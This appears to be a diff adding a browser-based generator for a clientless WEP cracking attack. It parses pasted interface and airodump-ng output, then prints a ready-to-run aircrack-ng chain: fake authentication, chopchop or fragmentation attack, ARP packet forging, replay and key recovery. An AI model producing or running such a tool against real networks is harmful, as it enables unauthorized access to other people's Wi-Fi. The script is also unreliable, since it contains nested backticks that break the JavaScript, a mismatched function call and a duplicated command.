@@ -1,0 +1,80 @@
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Clientless WEP Attack</title>
+</head>
+<body>
+<form id="frm1">
+	ip link show <br>
+	<input type="text" id="ipLinkShowInput" style="width:100%" autofocus><br>
+	<p id="searchCommand"></p><br>
+	<input type="text" id="airodumpInput" style="width:100%" autofocus><br>
+	<input type="button" onclick="myFunction()" value="Submit">
+</form>
+<p id="output"></p>
+<script>
+
+	
+function myFunction() {
+	var airodumpInput = document.getElementById("airodumpInput").value.trim().replace(/\s\s+/g, ' ');
+	var ipLinkShowInput = document.getElementById("ipLinkShowInput").value.trim().replace(/\s\s+/g, ' ');
+	
+	var airoSplit = airodumpInput.split(" ");
+	var apMac = airoSplit[0];
+	var channel = airoSplit[5];
+	var ssid = airoSplit[9];
+	
+	var ipSplit = ipLinkShowInput.split(" ");
+	var deviceName = ipSplit[1];
+	deviceName = deviceName.substring(0, deviceName.length - 1);
+	var mac = ipSplit[16].toUpperCase()
+	
+	
+	
+	document.getElementById("searchCommand").innerHTML = `sudo airodump-ng ${deviceName} -t WEP`
+		
+	
+
+	document.getElementById("output").innerHTML = 
+		"sudo airmon-ng check kill<br>sudo airmon-ng check kill<br>" 
+		+ monitorMode(deviceName, channel) + "<br>"
+		+ captureCommand(deviceName, channel, apMac) + "<br>" 
+		+ fakeAuth(ssid, apMac, mac, deviceName) + "<br>" 
+		+ chopChopAttack(apMac, mac, deviceName) + " OR         "   + fragmentationAttack(apMac, mac, deviceName) + "<br>"    
+		+ packetForge(apMac, mac, deviceName) + "<br>"       
+		+ replayAttack(deviceName) + "<br>"                 
+		+ "sudo aircrack-ng `ls -t cap1*.cap | head -1`";
+}
+
+function captureCommand(device, channel, ssid) {
+	return `sudo airodump-ng ${device} -c ${channel} --bssid ${ssid} -w cap1`
+}
+
+function monitorMode(device, channel) {
+	return `sudo iwconfig ${device} mode monitor`
+}
+
+function fakeAuth(ssid, apMac, mac, device) {
+	return `sudo aireplay-ng -1 6000 -o 1 -q 10 -e ${ssid} -a ${apMac} -h ${mac} ${device}`
+}
+
+function chopChopAttack(apMac, mac, device) {
+	return `sudo aireplay-ng -4 -b ${apMac} -h ${mac} ${device}`
+}
+
+function fragmentationAttack(apMac, mac, device) {
+	return `sudo aireplay-ng -5 -b ${apMac} -h ${mac} ${device}`
+}
+
+function packetForge(apMac, mac, device) {
+	return `sudo packetforge-ng -0 -a ${apMac} -h ${mac} -l 192.168.1.100 -k 192.168.1.255 -y `ls -t *.xor | head -1` -w arpRequest`
+}
+
+
+function replayAttack(apMac, mac, device) {
+	return `sudo aireplay-ng -2 -r arpRequest ${device}`
+}
+</script>
+</body>
+
+</html>
